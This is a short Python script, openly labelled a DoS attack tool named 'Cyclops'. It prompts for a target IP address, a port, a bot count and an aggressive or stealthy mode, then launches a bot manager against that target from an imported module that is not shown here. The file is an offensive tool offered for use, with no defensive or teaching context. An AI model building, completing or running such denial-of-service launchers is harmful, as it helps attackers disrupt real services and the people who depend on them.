# Date: 01/07/2019
# Author: Mohamed
# Description: Dos Attack

import platform
from os import system
from time import sleep   
from threading import Thread
from lib.bot import BotManager


class Cyclops:

    def __init__(self, ip, port, threads, is_aggressive):
        self.ip = ip
        self.port = port 
        self.threads = threads
        self.is_aggressive = is_aggressive
        self.bot_manager = BotManager(ip, port, threads, is_aggressive)

    def start(self):
        t = Thread(target=self.bot_manager.start)
        t.daemon = True 
        t.start()

        mode = 'Aggressive' if self.is_aggressive else 'Stealthy'
        print('Target: {}:{}\nMode: {}\nBots: {}'.format(self.ip, self.port, mode, self.threads))

        while True:
            try:
                sleep(0.5)
            except KeyboardInterrupt:
                self.stop()
                break
    
    def stop(self):
        print('Exiting ...')
        self.bot_manager.stop()
    

if __name__ == '__main__':
    ip = str(input('Enter an IP address: '))
    port = int(input('Enter a port number: '))
    total_bots = input('Enter amount of bots default(256): ').strip()
    total_bots = 256 if not total_bots or not total_bots.isdigit() else total_bots
    mode = str(input('Enter a mode (A)ggressive (S)tealthy: ')).strip()[0].upper()

    system('cls' if platform.system() == 'Windows' else 'clear')
    Cyclops(ip, port, total_bots, True if mode == 'A' else False).start()